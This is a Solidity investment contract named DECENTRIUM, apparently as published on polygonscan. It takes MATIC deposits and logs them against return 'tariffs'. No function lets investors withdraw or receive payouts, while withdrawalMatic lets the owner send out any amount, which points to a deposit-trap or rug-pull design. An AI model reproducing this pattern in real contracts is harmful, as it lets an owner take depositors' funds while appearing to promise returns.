/**
 *Submitted for verification at polygonscan.com on 2023-06-08
*/

// SPDX-License-Identifier: none
pragma solidity ^0.8.12;
/**     
 * @title SafeMath
 * @dev Math operations with safety checks that throw on error
 */
library SafeMath {

  /**
  * @dev Multiplies two numbers, throws on overflow.
  */
  function mul(uint256 a, uint256 b) internal pure returns (uint256) {
    if (a == 0) {
      return 0;
    }
    uint256 c = a * b;
    assert(c / a == b);
    return c;
  }
  /**
  * @dev Integer division of two numbers, truncating the quotient.
  */
  function div(uint256 a, uint256 b) internal pure returns (uint256) {
    // assert(b > 0); // Solidity automatically throws when dividing by 0
    uint256 c = a / b;
    // assert(a == b * c + a % b); // There is no case in which this doesn't hold
    return c;
  }
  /**
  * @dev Substracts two numbers, throws on overflow (i.e. if subtrahend is greater than minuend).
  */
  function sub(uint256 a, uint256 b) internal pure returns (uint256) {
    assert(b <= a);
    return a - b;
  }
  /**
  * @dev Adds two numbers, throws on overflow.
  */
  function add(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a + b;
    assert(c >= a); 
    return c;
  }
}
interface BEP20{
    function totalSupply() external view returns (uint theTotalSupply);
    function balanceOf(address _owner) external view returns (uint balance);
    function transfer(address _to, uint _value) external returns (bool success);
    function transferFrom(address _from, address _to, uint _value) external returns (bool success);
    function approve(address _spender, uint _value) external returns (bool success);
    function allowance(address _owner, address _spender) external view returns (uint remaining);
    event Transfer(address indexed _from, address indexed _to, uint _value);
    event Approval(address indexed _owner, address indexed _spender, uint _value);
}
contract Ownable {
  address public owner;  
  event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
  constructor() {
    owner = msg.sender;
  }
  modifier onlyOwner() {
    require(msg.sender == owner);
    _;
  }
}

contract DECENTRIUM is Ownable {   
    BEP20 token; 
    uint public MIN_DEPOSIT_BUSD = 1 ;
    address contractAddress = address(this);
    uint public tokenPrice         = 1;
    uint public tokenPriceDecimal  = 0;
   
    struct Tariff {
        uint time;
        uint percent;
    }

    struct Deposit {
        uint tariff;
        uint amount;
        uint at;
    }

    struct Investor {
        bool registered;
        Deposit[] deposits;
        uint invested;
        uint paidAt;
        uint withdrawn;
    }

    mapping (address => Investor) public investors;

    Tariff[] public tariffs;
    uint public totalInvested;
    address public contractAddr = address(this);
    constructor() {
        tariffs.push(Tariff(300 * 28800, 300));
        tariffs.push(Tariff(35  * 28800, 157));
        tariffs.push(Tariff(30  * 28800, 159));
        tariffs.push(Tariff(25  * 28800, 152));
        tariffs.push(Tariff(18  * 28800, 146));
    }
    using SafeMath for uint256;       
    event DepositAt(address user, uint tariff, uint amount);    
    
    function transferOwnership(address _to) public {
        require(msg.sender == owner, "Only owner");
        address oldOwner  = owner;
        owner = _to;
        emit OwnershipTransferred(oldOwner,_to);
    }
    
    function withdrawalMatic(address payable _to, uint _amount) external{
        
        require(msg.sender == owner, "Only owner");
        require(_amount != 0, "Zero amount error");

        _to.transfer(_amount);
    }

    function Contribution() external payable {
        uint tariff = 0;
        require(msg.value >= 0);
        require(tariff < tariffs.length);
        if(investors[msg.sender].registered){
            require(investors[msg.sender].deposits[0].tariff == tariff);
        }
    
        uint tokenVal = msg.value;
        
        investors[msg.sender].invested += tokenVal;
        totalInvested += tokenVal;
        
        investors[msg.sender].deposits.push(Deposit(tariff, tokenVal, block.timestamp));
        emit DepositAt(msg.sender, tariff, msg.value);
    } 

}